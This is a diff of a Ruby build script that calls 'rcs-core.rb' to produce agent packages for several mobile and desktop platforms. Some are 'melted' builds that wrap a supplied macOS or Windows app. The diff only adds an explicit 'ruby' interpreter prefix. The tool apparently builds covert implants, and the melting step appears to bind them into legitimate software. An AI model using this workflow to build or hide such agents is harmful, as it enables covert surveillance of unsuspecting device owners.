@@ -18,10 +18,10 @@ params = {platform: 'blackberry',
           }
 
 File.open('build.json', 'w') {|f| f.write params.to_json}
-system "./rcs-core.rb -u #{USER} -p #{PASS} -f #{FACTORY} -b build.json -o blackberry_local.zip" or raise("Failed")
+system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -f #{FACTORY} -b build.json -o blackberry_local.zip" or raise("Failed")
 params[:package][:type] = 'remote'
 File.open('build.json', 'w') {|f| f.write params.to_json}
-system "./rcs-core.rb -u #{USER} -p #{PASS} -f #{FACTORY} -b build.json -o blackberry_remote.zip" or raise("Failed")
+system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -f #{FACTORY} -b build.json -o blackberry_remote.zip" or raise("Failed")
 
 ###################################################################################################
 ###################################################################################################
@@ -31,7 +31,7 @@ params = {platform: 'android',
           }
 
 File.open('build.json', 'w') {|f| f.write params.to_json}
-system "./rcs-core.rb -u #{USER} -p #{PASS} -f #{FACTORY} -b build.json -o android.zip" or raise("Failed")
+system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -f #{FACTORY} -b build.json -o android.zip" or raise("Failed")
 
 ###################################################################################################
 ###################################################################################################
@@ -42,7 +42,7 @@ params = {platform: 'symbian',
           }
 
 File.open('build.json', 'w') {|f| f.write params.to_json}
-system "./rcs-core.rb -u #{USER} -p #{PASS} -f #{FACTORY} -b build.json -C symbian.cer -o symbian.zip" or raise("Failed")
+system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -f #{FACTORY} -b build.json -C symbian.cer -o symbian.zip" or raise("Failed")
 
 ###################################################################################################
 ###################################################################################################
@@ -51,7 +51,7 @@ params = {platform: 'ios',
           }
 
 File.open('build.json', 'w') {|f| f.write params.to_json}
-system "./rcs-core.rb -u #{USER} -p #{PASS} -f #{FACTORY} -b build.json -o ios.zip" or raise("Failed")
+system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -f #{FACTORY} -b build.json -o ios.zip" or raise("Failed")
 
 ###################################################################################################
 ###################################################################################################
@@ -63,10 +63,10 @@ if RUBY_PLATFORM =~ /mingw/
             }
 
   File.open('build.json', 'w') {|f| f.write params.to_json}
-  system "./rcs-core.rb -u #{USER} -p #{PASS} -f #{FACTORY} -b build.json -o winmo_local.zip" or raise("Failed")
+  system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -f #{FACTORY} -b build.json -o winmo_local.zip" or raise("Failed")
   params[:package][:type] = 'remote'
   File.open('build.json', 'w') {|f| f.write params.to_json}
-  system "./rcs-core.rb -u #{USER} -p #{PASS} -f #{FACTORY} -b build.json -o blackberry_remote.zip" or raise("Failed")
+  system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -f #{FACTORY} -b build.json -o blackberry_remote.zip" or raise("Failed")
 end
 ###################################################################################################
 ###################################################################################################
@@ -75,8 +75,8 @@ params = {platform: 'osx',
           }
 
 File.open('build.json', 'w') {|f| f.write params.to_json}
-system "./rcs-core.rb -u #{USER} -p #{PASS} -f #{FACTORY} -b build.json -o osx_default.zip" or raise("Failed")
-system "./rcs-core.rb -u #{USER} -p #{PASS} -f #{FACTORY} -b build.json -i macos_app.zip -o osx_melted.zip" or raise("Failed")
+system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -f #{FACTORY} -b build.json -o osx_default.zip" or raise("Failed")
+system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -f #{FACTORY} -b build.json -i macos_app.zip -o osx_melted.zip" or raise("Failed")
 
 ###################################################################################################
 ###################################################################################################
@@ -87,8 +87,8 @@ params = {platform: 'windows',
           }
 
 File.open('build.json', 'w') {|f| f.write params.to_json}
-system "./rcs-core.rb -u #{USER} -p #{PASS} -f #{FACTORY} -b build.json -o windows_default.zip" or raise("Failed")
-system "./rcs-core.rb -u #{USER} -p #{PASS} -f #{FACTORY} -b build.json -i windows_app.exe -o windows_melted.zip" or raise("Failed")
+system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -f #{FACTORY} -b build.json -o windows_default.zip" or raise("Failed")
+system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -f #{FACTORY} -b build.json -i windows_app.exe -o windows_melted.zip" or raise("Failed")
 end
 ###################################################################################################
 puts "End"
